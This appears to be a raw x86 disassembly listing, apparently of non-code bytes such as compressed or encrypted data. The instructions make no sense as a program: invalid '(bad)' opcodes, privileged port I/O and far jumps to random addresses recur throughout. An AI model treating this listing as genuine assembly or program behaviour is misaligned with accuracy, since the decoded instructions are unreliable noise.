  40d368:	mov    ds:0xc469ba50,eax
  40d36d:	aas    
  40d36e:	sub    ebp,DWORD PTR [eax+0x6b]
  40d371:	mov    WORD PTR [edx],es
  40d373:	stos   BYTE PTR es:[edi],al
  40d374:	aaa    
  40d375:	test   eax,0xcfa0a00c
  40d37a:	ja     0x40d389
  40d37c:	push   edx
  40d37d:	cld    
  40d37e:	fdivr  QWORD PTR [ecx+0x2]
  40d381:	jo     0x40d305
  40d383:	sub    eax,0x753c92e9
  40d388:	out    dx,al
  40d389:	lock pop ss
  40d38b:	push   edx
  40d38c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d38d:	jne    0x40d390
  40d38f:	cmp    BYTE PTR [esi+0x3c],al
  40d392:	jb     0x40d38d
  40d394:	(bad)  
  40d395:	or     eax,0xe1ab93a0
  40d39a:	adc    BYTE PTR [ebx+0x3c027f4a],bl
  40d3a0:	xchg   ecx,eax
  40d3a1:	mov    cl,BYTE PTR [esi-0x65]
  40d3a4:	aad    0xa9
  40d3a6:	je     0x40d399
  40d3a8:	mov    esi,0xfaf2c802
  40d3ad:	jne    0x40d37b
  40d3af:	bound  esi,QWORD PTR [edi-0x744b6b45]
  40d3b5:	(bad)  
  40d3b6:	xor    eax,0x79875dbe
  40d3bb:	push   esi
  40d3bc:	shl    BYTE PTR [ebx+0x200001c8],1
  40d3c2:	out    dx,al
  40d3c3:	mov    edi,0x3829a082
  40d3c8:	pop    edi
  40d3c9:	in     eax,0x36
  40d3cb:	xchg   BYTE PTR [ebx],ch
  40d3cd:	pusha  
  40d3ce:	add    DWORD PTR [ecx-0x39],ecx
  40d3d1:	xchg   esp,eax
  40d3d2:	cmp    al,0xfc
  40d3d4:	mov    edx,DWORD PTR [edx+0x58190933]
  40d3da:	pop    edx
  40d3db:	sbb    edi,DWORD PTR [ebp-0x17f63145]
  40d3e1:	sub    DWORD PTR [ebp-0x74f23ef2],esp
  40d3e7:	test   DWORD PTR ds:0x86bd5374,ebx
  40d3ed:	call   0x14a2:0x139b06d
  40d3f4:	mov    dl,BYTE PTR [ecx-0xa]
  40d3f7:	xchg   DWORD PTR [esi+0x12728652],esp
  40d3fd:	cmc    
  40d3fe:	out    0x29,al
  40d400:	jmp    eax
  40d402:	imul   esi,DWORD PTR [esi+ebx*2],0x80620d1
  40d409:	bound  ebx,QWORD PTR [edx-0x17991d7c]
  40d40f:	cmc    
  40d410:	call   0xc392:0x50959c28
  40d417:	pop    edx
  40d418:	mov    esi,0x58602126
  40d41d:	push   esi
  40d41e:	adc    cl,BYTE PTR [esi]
  40d420:	in     al,0x4
  40d422:	and    DWORD PTR [esi-0x4e],ecx
  40d425:	stos   DWORD PTR es:[edi],eax
  40d426:	and    dh,dh
  40d428:	outs   dx,BYTE PTR ds:[esi]
  40d429:	shr    DWORD PTR [ebp-0x80],0xff
  40d42d:	aas    
  40d42e:	ret    
  40d42f:	jge    0x40d4a3
  40d431:	jle    0x40d3e6
  40d433:	mov    ds:0xacf07d91,eax
  40d438:	lahf   
  40d439:	inc    ebp
  40d43a:	mov    dh,0xdb
  40d43c:	stc    
  40d43d:	mov    ebp,0xdec633c0
  40d442:	fdivp  st(0),st
  40d444:	stc    
  40d445:	add    BYTE PTR [eax+0x5f073f7f],bl
  40d44b:	sub    al,0xd3
  40d44d:	push   esi
  40d44e:	stc    
  40d44f:	mov    edx,0x420e0aee
  40d454:	lahf   
  40d455:	hlt    
  40d456:	xor    al,0x85
  40d458:	xchg   edx,eax
  40d459:	stc    
  40d45a:	loop   0x40d48f
  40d45c:	push   ebp
  40d45d:	and    ch,dl
  40d45f:	sub    DWORD PTR [esi+0x3dff52ca],0xffffff93
  40d466:	jmp    0xda03:0x41fe4c6b
  40d46d:	adc    DWORD PTR [eax-0x61],ebp
  40d470:	sbb    BYTE PTR [edx+eiz*8],0x70
  40d474:	bound  ebx,QWORD PTR [edx]
  40d476:	sahf   
  40d477:	stos   DWORD PTR es:[edi],eax
  40d478:	cs jl  0x40d4aa
  40d47b:	bnd ret 
  40d47d:	mov    DWORD PTR [edx+ebp*4-0x79c96cf0],ecx
  40d484:	pop    ebp
  40d485:	dec    ebx
  40d486:	loopne 0x40d418
  40d488:	adc    BYTE PTR [ebx],bl
  40d48a:	outs   dx,BYTE PTR ds:[esi]
  40d48b:	int    0x3
  40d48d:	dec    esi
  40d48e:	clc    
  40d48f:	or     eax,0xbc102aaa
  40d494:	pop    eax
  40d495:	icebp  
  40d496:	mov    edi,0xafb804a4
  40d49b:	enter  0xc321,0x51
  40d49f:	jmp    0xbda39e7
  40d4a4:	enter  0xa1f2,0x17
  40d4a8:	push   ebx
  40d4a9:	neg    BYTE PTR [edi+0x3bd4fc43]
  40d4af:	ja     0x40d4d5
  40d4b1:	sbb    bh,BYTE PTR [edi-0x4e]
  40d4b4:	xchg   BYTE PTR [ebx-0x400a122d],ch
  40d4ba:	push   esp
  40d4bb:	mov    ebx,DWORD PTR [bp+di]
  40d4be:	sqrtps xmm3,XMMWORD PTR [esi+edi*8+0x1b]
  40d4c3:	mov    bl,0x9a
  40d4c5:	enter  0x2ff8,0x1c
  40d4c9:	out    0x67,al
  40d4cb:	es cmp al,0x0
  40d4ce:	popf   
  40d4cf:	outs   dx,BYTE PTR ds:[esi]
  40d4d0:	(bad)  
  40d4d1:	jo     0x40d52d
  40d4d3:	or     ebp,DWORD PTR [edi]
  40d4d5:	pop    esp
  40d4d6:	sbb    ah,0x5a
  40d4d9:	pop    eax
  40d4da:	(bad)  
  40d4db:	jae    0x40d509
  40d4dd:	inc    esp
  40d4de:	dec    edi
  40d4df:	xor    esi,eax
  40d4e1:	leave  
  40d4e2:	aaa    
  40d4e3:	je     0x40d4b8
  40d4e5:	mov    al,al
  40d4e7:	push   eax
  40d4e8:	adc    DWORD PTR [edx+0x6c702c2a],edx
  40d4ee:	and    al,BYTE PTR [edi+0x33]
  40d4f1:	mov    cl,0x65
  40d4f3:	call   0xaffb69ea
  40d4f8:	nop
  40d4f9:	gs loopne 0x40d541
  40d4fc:	adc    edi,DWORD PTR [esi+0x24]
  40d4ff:	pushf  
  40d500:	xchg   ebx,eax
  40d501:	cmc    
  40d502:	jg     0x40d519
  40d504:	mov    bl,0x10
  40d506:	loopne 0x40d4ae
  40d508:	mov    esi,0x697d7460
  40d50d:	and    ah,BYTE PTR [eax+0x5181c35]
  40d513:	add    DWORD PTR [edi+edi*2],ecx
  40d516:	push   ebx
  40d517:	add    bl,0xd7
  40d51a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d51b:	sub    eax,0x2fb6a36
  40d520:	jne    0x40d56a
  40d522:	and    BYTE PTR ds:0x6ee4df1d,cl
  40d528:	and    dl,bl
  40d52a:	out    dx,eax
  40d52b:	ss push edx
  40d52d:	mov    esi,0x48f11954
  40d533:	sahf   
  40d534:	scas   eax,DWORD PTR es:[edi]
  40d535:	push   cs
  40d536:	fdiv   QWORD PTR [esi]
  40d538:	out    dx,al
  40d539:	imul   esi,edi,0x45
  40d53c:	not    BYTE PTR [edx+0x18733c6c]
  40d542:	sbb    esp,ebp
  40d544:	sub    BYTE PTR [edx+0x4516d5d9],bl
  40d54a:	pusha  
  40d54b:	pop    ds
  40d54c:	ja     0x40d4ea
  40d54e:	push   ss
  40d54f:	xchg   edx,eax
  40d550:	jp     0x40d53b
  40d552:	xor    BYTE PTR [esi+0x9],cl
  40d555:	lahf   
  40d556:	cmp    al,0xe3
  40d558:	(bad)  
  40d559:	or     eax,0x9947926f
  40d55e:	mov    esp,DWORD PTR [esi+0x1ed34409]
  40d564:	cdq    
  40d565:	arpl   WORD PTR [ebx],ax
  40d567:	scas   eax,DWORD PTR es:[edi]
  40d568:	xchg   DWORD PTR ds:[edi-0x317f76b5],ebp
  40d56f:	iret   
  40d570:	out    0x33,al
  40d572:	out    dx,al
  40d573:	pop    DWORD PTR [edi-0x756b8f06]
  40d579:	stc    
  40d57a:	and    eax,0x2f7a9ede
  40d57f:	pop    edx
  40d580:	pop    esi
  40d581:	pop    eax
  40d582:	out    dx,eax
  40d583:	cmp    al,0x5c
  40d585:	inc    eax
  40d586:	sub    eax,0x6f2e521e
  40d58b:	push   ecx
  40d58c:	jne    0x40d53d
  40d58e:	mov    al,BYTE PTR [edx+0x40]
  40d591:	jle    0x40d5ce
  40d593:	cmp    edx,ebx
  40d595:	int3   
  40d596:	inc    edi
  40d597:	imul   esi,DWORD PTR [ebx],0x70
  40d59a:	test   eax,0xa90e3c6f
  40d59f:	sahf   
  40d5a0:	out    dx,eax
  40d5a1:	(bad)  
  40d5a2:	ffreep st(1)
  40d5a4:	or     DWORD PTR [ebx-0x53],0xdeebaa63
  40d5ab:	xchg   DWORD PTR [ebp*1-0x34a1cdb6],edi
  40d5b2:	cmp    eax,0x86e97073
  40d5b7:	out    dx,al
  40d5b8:	fiadd  WORD PTR [ebx+edx*1+0x67c9076b]
  40d5bf:	pop    eax
  40d5c0:	std    
  40d5c1:	inc    ebx
  40d5c2:	inc    ecx
  40d5c3:	jecxz  0x40d583
  40d5c5:	retf   0xa9e5
  40d5c8:	popa   
  40d5c9:	mov    edx,0x341de09d
  40d5ce:	lods   al,BYTE PTR ds:[esi]
  40d5cf:	into   
  40d5d0:	ins    DWORD PTR es:[edi],dx
  40d5d1:	enter  0xc123,0xaf
  40d5d5:	inc    edi
  40d5d6:	cmp    DWORD PTR [ecx],ebp
  40d5d8:	xchg   ebp,eax
  40d5d9:	fwait
  40d5da:	sub    al,0xf9
  40d5dc:	mov    dl,0x63
  40d5de:	sub    bl,BYTE PTR [esp+ebx*2+0x5e]
  40d5e2:	or     bh,BYTE PTR [ecx-0x70]
  40d5e5:	scas   eax,DWORD PTR es:[edi]
  40d5e6:	pop    es
  40d5e7:	pop    edx
  40d5e8:	inc    ebx
  40d5e9:	dec    ebp
  40d5ea:	fs push edx
  40d5ec:	aam    0x89
  40d5ee:	nop
  40d5ef:	inc    eax
  40d5f0:	clc    
  40d5f1:	mov    WORD PTR [ebp-0x4d],ds
  40d5f4:	mov    bh,0x6f
  40d5f6:	mov    al,0x4d
  40d5f8:	mov    al,ds:0x4473601d
  40d5fd:	les    esi,FWORD PTR [eax]
  40d5ff:	aam    0xfd
  40d601:	ficom  DWORD PTR [ebp-0x23f7859a]
  40d607:	pop    eax
  40d608:	push   esp
  40d609:	dec    ebx
  40d60a:	push   edx
  40d60b:	or     BYTE PTR [esi+ecx*2],0x48
  40d60f:	ret    
  40d610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d611:	icebp  
  40d612:	mov    al,0x2e
  40d614:	jnp    0x40d606
  40d616:	cli    
  40d617:	or     esi,DWORD PTR [ebx]
  40d619:	retf   
  40d61a:	int    0x59
  40d61c:	ret    
  40d61d:	pop    ebx
  40d61e:	add    bl,BYTE PTR [esp+ebp*1+0x72fdc706]
  40d625:	mov    eax,DWORD PTR [eax]
  40d627:	dec    ebp
  40d628:	retf   
  40d629:	dec    eax
  40d62a:	icebp  
  40d62b:	out    0xab,eax
  40d62d:	lds    esi,FWORD PTR ds:0x16be97df
  40d633:	dec    ebp
  40d634:	lds    edx,FWORD PTR [ecx+eiz*4+0x46]
  40d638:	call   0xec40:0x785c1513
  40d63f:	arpl   WORD PTR [edx],bp
  40d641:	sbb    ecx,0x75
  40d644:	fs popf 
  40d646:	and    edx,DWORD PTR [edi+0x172373b4]
  40d64c:	add    esp,DWORD PTR [edi+eax*4-0x6ddddbf1]
  40d653:	(bad)  
  40d654:	push   ebp
  40d655:	mov    dl,0x9f
  40d657:	mov    ds:0x4fbdca04,al
  40d65c:	xor    ah,BYTE PTR [esi+0x5fd4fdde]
  40d662:	in     eax,0x20
  40d664:	pusha  
  40d665:	xor    ah,dl
  40d667:	cmp    dh,BYTE PTR [ebx]
  40d669:	fwait
  40d66a:	adc    ebx,edx
  40d66c:	fsubr  QWORD PTR [eax]
  40d66e:	rcr    cl,cl
  40d670:	inc    esp
  40d671:	test   al,0x60
  40d673:	jl     0x40d69e
  40d675:	(bad)  
  40d677:	stos   DWORD PTR es:[edi],eax
  40d678:	push   0xa9bf95e1
  40d67d:	and    DWORD PTR [esi+eiz*1+0x3],0x12
  40d682:	and    DWORD PTR [edx+ebx*2+0x76e84742],ebp
  40d689:	fdivr  QWORD PTR ds:0x60e9604d
  40d68f:	(bad)  
  40d690:	dec    ecx
  40d691:	cmp    eax,0x3ff8879c
  40d696:	outs   dx,DWORD PTR ds:[esi]
  40d697:	dec    edx
  40d698:	jmp    0x40d694
  40d69a:	jp     0x40d64c
  40d69c:	ins    BYTE PTR es:[edi],dx
  40d69d:	mov    esi,0xf80e05c9
  40d6a2:	add    bl,bl
  40d6a4:	(bad)  
  40d6a5:	aam    0xac
  40d6a7:	mov    esi,0x26bdb221
  40d6ac:	mov    al,0x61
  40d6ae:	ss mov al,0x93
  40d6b1:	fidivr WORD PTR [esi+edx*1-0x24]
  40d6b5:	scas   al,BYTE PTR es:[edi]
  40d6b6:	cmp    eax,0xd1f3f6f8
  40d6bb:	cmp    eax,0x3d74b931
  40d6c0:	or     al,dl
  40d6c2:	in     al,0xb
  40d6c4:	mov    ecx,0xe251c9c4
  40d6c9:	(bad)  
  40d6ca:	fiadd  WORD PTR [esi+eiz*8]
  40d6cd:	int3   
  40d6ce:	mov    bl,0x5a
  40d6d0:	les    esp,FWORD PTR [ebp-0x3c14bd78]
  40d6d6:	sbb    ch,BYTE PTR [edx-0x518b2414]
  40d6dc:	fs retf 0xf786
  40d6e0:	cmp    al,0x21
  40d6e3:	push   0xc08f1bb5
  40d6e8:	fsubr  QWORD PTR [esi+0xe]
  40d6eb:	mov    esp,0xdab28cef
  40d6f0:	pop    edx
  40d6f1:	fistp  WORD PTR [eax+0x39bb12f7]
  40d6f7:	adc    eax,0x1fada192
  40d6fc:	clc    
  40d6fd:	xchg   edi,eax
  40d6fe:	iret   
  40d6ff:	fisub  WORD PTR [edi+0x4b]
  40d702:	sub    edi,DWORD PTR [ecx+0x4211aef9]
  40d708:	aas    
  40d709:	(bad)  
  40d70a:	cmp    cl,BYTE PTR [eax*4-0x2ef5cdaa]
  40d711:	das    
  40d712:	ins    DWORD PTR es:[edi],dx
  40d713:	xchg   ecx,eax
  40d714:	xchg   esp,eax
  40d715:	cmp    DWORD PTR [ecx+0x75b876b2],edi
  40d71b:	das    
  40d71c:	jne    0x40d729
  40d71e:	sbb    al,BYTE PTR [ebx+ebp*2]
  40d721:	inc    ebx
  40d722:	xchg   esp,eax
  40d723:	add    BYTE PTR [eax+0x3fabedd6],cl
  40d729:	dec    ebx
  40d72a:	pop    ebp
  40d72b:	and    BYTE PTR [edi],ch
  40d72d:	out    dx,eax
  40d72e:	enter  0xc4a6,0x53
  40d732:	loope  0x40d753
  40d734:	adc    eax,0x40f30a17
  40d739:	mul    BYTE PTR [edi]
  40d73b:	call   0x8507:0xbbd4d5a5
  40d742:	scas   al,BYTE PTR es:[edi]
  40d743:	(bad)  
  40d744:	loopne 0x40d70a
  40d746:	sbb    DWORD PTR [esi],0x5f5477f6
  40d74c:	mov    ds:0x2c4530de,al
  40d751:	sar    BYTE PTR [eax+0x4a],0x62
  40d755:	pop    ss
  40d756:	mov    ah,0x31
  40d758:	sbb    eax,0x9f46a495
  40d75d:	inc    esp
  40d75e:	or     esi,DWORD PTR [ecx-0x5d487ad2]
  40d764:	sbb    al,0x27
  40d766:	in     al,dx
  40d767:	mov    eax,es:0x1831f41e
  40d76d:	sub    eax,0xa11fd4fc
  40d772:	retf   
  40d773:	adc    BYTE PTR [esi-0x61d21073],0x1f
  40d77a:	lods   al,BYTE PTR ds:[esi]
  40d77b:	repnz inc ebp
  40d77d:	je     0x40d799
  40d77f:	pop    ecx
  40d780:	aaa    
  40d781:	(bad)
  40d784:	lahf   
  40d785:	cmp    eax,0x6b5f8d78
  40d78a:	push   edx
  40d78b:	jmp    0xfe643ff9
  40d790:	cmp    eax,0x594a5f40
  40d795:	add    eax,0x77f07837
  40d79a:	data16 jbe 0x40d7cd
  40d79d:	cdq    
  40d79e:	inc    ecx
  40d79f:	ss push ebx
  40d7a1:	inc    edi
  40d7a2:	idiv   DWORD PTR [ebp+0x9]
  40d7a5:	jg     0x40d77e
  40d7a7:	xor    al,0x8c
  40d7a9:	inc    edi
  40d7aa:	cmp    bh,ch
  40d7ac:	stos   BYTE PTR es:[edi],al
  40d7ad:	dec    ecx
  40d7ae:	or     al,cl
  40d7b0:	popa   
  40d7b1:	pop    edi
  40d7b2:	mov    edi,0x1fd8a67c
  40d7b7:	int    0x8
  40d7b9:	sahf   
  40d7ba:	test   eax,0x61144a06
  40d7bf:	cmp    al,0xc0
  40d7c1:	clc    
  40d7c2:	retf   0x258a
  40d7c5:	loop   0x40d790
  40d7c7:	popf   
  40d7c8:	ret    0x510d
  40d7cb:	adc    DWORD PTR [edx],edi
  40d7cd:	leave  
  40d7ce:	mov    eax,ds:0xc9674e2
  40d7d3:	call   0xa975e69e
  40d7d8:	and    DWORD PTR [edi-0x319e1013],ebp
  40d7de:	pop    esi
  40d7df:	(bad)  
  40d7e0:	dec    edi
  40d7e1:	shl    DWORD PTR [ebp-0x47fb3e55],0x56
  40d7e8:	je     0x40d847
  40d7ea:	push   es
  40d7eb:	retf   0xdd58
  40d7ee:	and    edx,DWORD PTR [ebp+0x27e783]
  40d7f4:	loop   0x40d7f9
  40d7f6:	lahf   
  40d7f7:	sahf   
  40d7f8:	pop    ecx
  40d7f9:	mov    esp,0xae033210
  40d7fe:	jmp    0x774b:0xb6533b64
  40d805:	push   esi
  40d806:	cdq    
  40d807:	out    dx,eax
  40d808:	test   DWORD PTR [edx-0x2d],esp
  40d80b:	repnz das 
  40d80d:	lahf   
  40d80e:	mov    ebp,0x9f8e503
  40d813:	inc    ecx
  40d814:	mul    BYTE PTR [esi-0xb]
  40d817:	pushf  
  40d818:	xchg   esi,eax
  40d819:	retf   0xc323
  40d81c:	icebp  
  40d81d:	scas   eax,DWORD PTR es:[edi]
  40d81e:	adc    ecx,esp
  40d820:	pop    ebx
  40d821:	push   cs
  40d822:	repnz stos DWORD PTR es:[edi],eax
  40d824:	ds ret 
  40d826:	lahf   
  40d827:	pushf  
  40d828:	pop    ds
  40d829:	(bad)  [eax-0x69b60775]
  40d82f:	adc    BYTE PTR [edi+0x5c5afe9a],al
  40d835:	jl     0x40d813
  40d837:	mov    edx,0xc30f9aa
  40d83c:	push   ss
  40d83d:	mov    edx,0x79b80060
  40d842:	dec    edi
  40d843:	stc    
  40d844:	push   esi
  40d845:	push   eax
  40d846:	xor    al,0xa6
  40d848:	lods   eax,DWORD PTR ds:[esi]
  40d849:	mov    dh,BYTE PTR [esi-0x3c5fa21d]
  40d84f:	add    DWORD PTR ds:0x6d557a87,ebx
  40d855:	jecxz  0x40d825
  40d857:	cmp    dh,BYTE PTR [edi+edi*1]
  40d85a:	sub    DWORD PTR [esi],edx
  40d85c:	fmul   st,st(4)
  40d85e:	or     cl,BYTE PTR [ecx+ebp*1]
  40d861:	pop    ecx
  40d862:	pop    ebp
  40d863:	sub    eax,0xbca3bb6b
  40d868:	sbb    al,0xd7
  40d86a:	xchg   ecx,eax
  40d86b:	scas   eax,DWORD PTR es:[edi]
  40d86c:	shl    BYTE PTR [ebx+0x6b],cl
  40d86f:	mov    esi,DWORD PTR [ebp-0x49]
  40d872:	xor    eax,edi
  40d874:	cmp    al,0x4f
  40d876:	mov    WORD PTR [esi],cs
  40d878:	test   al,0x9a
  40d87a:	and    bl,BYTE PTR [edx+0x12]
  40d87d:	dec    ecx
  40d87e:	loop   0x40d897
  40d880:	pop    ss
  40d881:	pusha  
  40d882:	arpl   WORD PTR [eax-0x2430c3a1],dx
  40d888:	mov    dh,0xfa
  40d88a:	js     0x40d828
  40d88c:	or     ebx,DWORD PTR [ecx]
  40d88e:	add    eax,0x4ecf5fef
  40d893:	xor    edx,DWORD PTR [eax+0x3f]
  40d896:	mov    edi,DWORD PTR [ebx]
  40d898:	cmp    edx,eax
  40d89a:	data16 xchg BYTE PTR [ecx+0x4dc009de],al
  40d8a1:	shl    DWORD PTR [edx-0x35b4089c],0xd8
  40d8a8:	push   0xffffffed
  40d8aa:	sub    eax,0x377c97f4
  40d8af:	and    al,0x29
  40d8b1:	cmp    BYTE PTR [edx-0x57],bl
  40d8b4:	mov    ebp,0x4504f690
  40d8b9:	retf   0xa03
  40d8bc:	ins    DWORD PTR es:[edi],dx
  40d8bd:	nop
  40d8be:	(bad)  
  40d8c0:	xor    dh,cl
  40d8c2:	push   edx
  40d8c3:	ja     0x40d892
  40d8c5:	push   ecx
  40d8c6:	adc    eax,0xf0bb5a6d
  40d8cb:	mov    dl,0xe
  40d8cd:	xor    esp,DWORD PTR [edi]
  40d8cf:	std    
  40d8d0:	jle    0x40d8dd
  40d8d2:	in     eax,0x66
  40d8d4:	push   ebp
  40d8d5:	jp     0x40d956
  40d8d7:	inc    edx
  40d8d8:	test   edi,edi
  40d8da:	inc    esi
  40d8db:	into   
  40d8dc:	jns    0x40d864
  40d8de:	into   
  40d8df:	scas   al,BYTE PTR es:[edi]
  40d8e0:	dec    ecx
  40d8e1:	popf   
  40d8e2:	les    edi,FWORD PTR [ebx-0x1d33b345]
  40d8e8:	adc    al,0x34
  40d8ea:	pop    eax
  40d8eb:	push   ebx
  40d8ec:	adc    ch,BYTE PTR [ecx-0x3a]
  40d8ef:	nop
  40d8f0:	test   DWORD PTR [edx],esp
  40d8f2:	sbb    eax,0xa108c181
  40d8f7:	cld    
  40d8f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8f9:	xchg   esi,eax
  40d8fa:	daa    
  40d8fb:	in     eax,dx
  40d8fc:	jne    0x40d8c3
  40d8fe:	jbe    0x40d89d
  40d900:	adc    al,BYTE PTR [ebx-0x5]
  40d903:	jmp    0x73ac:0x105d935c
  40d90a:	mov    esi,0x2f286b3e
  40d90f:	or     edx,DWORD PTR [edi-0x38559bab]
  40d915:	add    al,0xd9
  40d917:	sbb    dl,BYTE PTR [edx]
  40d919:	lods   eax,DWORD PTR ds:[esi]
  40d91a:	fld1   
  40d91c:	xor    BYTE PTR [edi+0x3e3d1128],bh
  40d922:	(bad)  
  40d923:	mov    eax,ds:0x12aa4c5a
  40d928:	ret    
  40d929:	pop    ecx
  40d92a:	cli    
  40d92b:	sti    
  40d92c:	pop    eax
  40d92d:	and    DWORD PTR [ecx-0x6b],ecx
  40d930:	push   ss
  40d931:	icebp  
  40d932:	sbb    DWORD PTR [edi],0x33
  40d935:	mov    al,ds:0xbd6ad2dc
  40d93a:	xor    al,0x8a
  40d93c:	inc    eax
  40d93d:	mov    ds:0x38698858,al
  40d942:	inc    edi
  40d943:	in     eax,dx
  40d944:	dec    esi
  40d945:	sub    DWORD PTR [esi],0xffffffdd
  40d948:	sbb    ah,BYTE PTR [edi-0x318134b3]
  40d94e:	(bad)  
  40d94f:	fndisi(8087 only) 
  40d951:	pop    esp
  40d952:	jns    0x40d904
  40d954:	jg     0x40d928
  40d956:	outs   dx,DWORD PTR ds:[esi]
  40d957:	fwait
  40d958:	mov    al,BYTE PTR [edx-0x1c2041a]
  40d95e:	in     al,0x19
  40d960:	or     ch,bl
  40d962:	ret    0x6d2c
  40d965:	push   cs
  40d966:	cs cld 
  40d968:	std    
  40d969:	inc    ebx
  40d96a:	push   es
  40d96b:	pop    esi
  40d96c:	cdq    
  40d96d:	stos   DWORD PTR es:[edi],eax
  40d96e:	dec    esi
  40d96f:	leave  
  40d970:	popa   
  40d971:	(bad)  
  40d972:	movd   mm7,ebp
  40d975:	cdq    
  40d976:	out    dx,al
  40d977:	ja     0x40d901
  40d979:	cdq    
  40d97a:	adc    BYTE PTR [edi-0x6b79fdb9],dl
  40d980:	sahf   
  40d981:	ins    DWORD PTR es:[edi],dx
  40d982:	call   0xe5c6:0x1366c295
  40d989:	fmulp  st(5),st
  40d98b:	enter  0x51a0,0xd
  40d98f:	adc    bl,BYTE PTR [edx]
  40d991:	imul   edi,DWORD PTR [eax],0xffffffbb
  40d994:	fucomip st,st(1)
  40d996:	mov    eax,0x7fa586aa
  40d99b:	enter  0x46d5,0xe6
  40d99f:	push   0xffffffda
  40d9a1:	jge    0x40da1c
  40d9a3:	inc    edi
  40d9a4:	push   ebx
  40d9a5:	sahf   
  40d9a6:	test   BYTE PTR [ebp+0x71],0xd7
  40d9aa:	push   esp
  40d9ab:	add    ebx,edi
  40d9ad:	leave  
  40d9ae:	inc    ebp
  40d9af:	daa    
  40d9b0:	test   DWORD PTR [ebx+eax*2],edi
  40d9b3:	mov    eax,0xa28e2829
  40d9b8:	add    edx,DWORD PTR [esi-0x5257550e]
  40d9be:	(bad)  
  40d9bf:	in     al,0xfb
  40d9c1:	mov    ch,0x53
  40d9c3:	mov    gs,WORD PTR [esi+edx*2+0x5c]
  40d9c7:	enter  0xb3f2,0x53
  40d9cb:	adc    cl,BYTE PTR [edx-0x51]
  40d9ce:	or     ch,BYTE PTR [edx+0x8]
  40d9d1:	es lock pop ecx
  40d9d4:	jge    0x40da01
  40d9d6:	xor    ebx,DWORD PTR [ebp-0x3]
  40d9d9:	outs   dx,BYTE PTR ds:[esi]
  40d9da:	jge    0x40d982
  40d9dc:	lahf   
  40d9dd:	sbb    BYTE PTR [edx],cl
  40d9df:	ror    DWORD PTR [ecx],cl
  40d9e1:	stos   BYTE PTR es:[edi],al
  40d9e2:	out    0x12,eax
  40d9e4:	xor    cl,BYTE PTR [eax]
  40d9e6:	in     eax,dx
  40d9e7:	ror    DWORD PTR [ebp-0x3051d661],1
  40d9ed:	or     eax,0x34bc1368
  40d9f2:	imul   BYTE PTR [ebp-0x3277a115]
  40d9f8:	dec    esi
  40d9f9:	into   
  40d9fa:	popf   
  40d9fb:	inc    edx
  40d9fc:	into   
  40d9fd:	fdiv   DWORD PTR [esi-0x16364fea]
  40da03:	sub    DWORD PTR [esi],ebx
  40da05:	or     dl,BYTE PTR [eax+edi*8-0xf18a804]
  40da0c:	(bad)  
  40da0d:	in     eax,0xab
  40da0f:	pop    ebp
  40da10:	push   cs
  40da11:	push   es
  40da12:	mov    gs,WORD PTR [ecx+0x4bac736b]
  40da18:	sar    DWORD PTR ds:0xc80c7682,0x4e
  40da1f:	jnp    0x40d9d1
  40da21:	add    ebx,DWORD PTR [eax-0x89872bb]
  40da27:	(bad)  
  40da28:	rcr    DWORD PTR [eax],0xe2
  40da2b:	mov    ch,0x24
  40da2d:	pop    edi
  40da2e:	jno    0x40da09
  40da30:	mul    eax
  40da32:	popa   
  40da33:	stos   BYTE PTR es:[edi],al
  40da34:	out    dx,al
  40da35:	mov    esi,0xb429a4ef
  40da3a:	test   BYTE PTR [edx],dl
  40da3c:	rcl    BYTE PTR [ebx+0x11],cl
  40da3f:	imul   ecx,edx,0xfffffffe
  40da42:	and    edx,ebx
  40da44:	lock data16 cmp BYTE PTR [edx+0x33],bl
  40da49:	dec    esp
  40da4a:	shl    bh,cl
  40da4c:	jl     0x40dabe
  40da4e:	or     edi,ebx
  40da50:	fldcw  WORD PTR [edi]
  40da52:	and    DWORD PTR [edi+edx*8],ecx
  40da55:	xor    bh,BYTE PTR [eax-0x996f02]
  40da5b:	ret    0x419f
  40da5e:	pop    ss
  40da5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da60:	fdiv   st(0),st
  40da62:	push   ebx
  40da63:	ret    0x88c1
  40da66:	xchg   edx,eax
  40da67:	daa    
  40da68:	repz adc eax,edx
  40da6b:	pop    ds
  40da6c:	daa    
  40da6d:	sub    eax,0xa30092af
  40da72:	popa   
  40da73:	mov    esp,DWORD PTR [edi]
  40da75:	and    bh,ch
  40da77:	ja     0x40dac8
  40da79:	dec    esp
  40da7a:	and    DWORD PTR [ecx],esp
  40da7c:	mov    ah,dh
  40da7e:	cmp    BYTE PTR [ebx-0x2d],0x6a
  40da82:	dec    ebx
  40da83:	jmp    0x2d2641b6
  40da88:	outs   dx,BYTE PTR ds:[esi]
  40da89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da8a:	ins    DWORD PTR es:[edi],dx
  40da8b:	into   
  40da8c:	sub    BYTE PTR [edi],0x9
  40da8f:	cmp    eax,0x43c1f8b
  40da94:	mov    ch,0xd4
  40da96:	mov    eax,0x6d047f40
  40da9b:	fs xchg edx,eax
  40da9d:	mov    ah,0x63
  40da9f:	push   esp
  40daa0:	xchg   ecx,eax
  40daa1:	inc    edx
  40daa2:	xchg   ecx,eax
  40daa3:	je     0x40da99
  40daa5:	int    0x5f
  40daa7:	js     0x40da3e
  40daa9:	aaa    
  40daaa:	xchg   edi,eax
  40daab:	clc    
  40daac:	sub    al,BYTE PTR [eax+0x15]
  40daaf:	in     eax,0x72
  40dab1:	test   al,0xab
  40dab3:	leave  
  40dab4:	and    eax,0xb5cd12e0
  40dab9:	and    ebx,ecx
  40dabb:	mov    al,0x90
  40dabd:	sbb    ch,BYTE PTR ds:0xa14a9c92
  40dac3:	sbb    eax,0xadb2c178
  40dac8:	jge    0x40da76
  40daca:	fld    DWORD PTR [esi-0x56]
  40dacd:	dec    esp
  40dace:	add    BYTE PTR [ebx-0x30cb3524],dl
  40dad4:	rcl    DWORD PTR [edx],1
  40dad6:	je     0x40daf8
  40dad8:	ret    0xb4f1
  40dadb:	sbb    al,0x15
  40dadd:	ror    BYTE PTR [ecx],0xb3
  40dae0:	mov    al,ds:0xd040064f
  40dae5:	mov    al,ds:0xc512ea9b
  40daea:	cmp    dh,BYTE PTR [edx-0x23]
  40daed:	push   esi
  40daee:	or     eax,0x6b9c0fe2
  40daf3:	add    esp,DWORD PTR [esp+eiz*2+0x66]
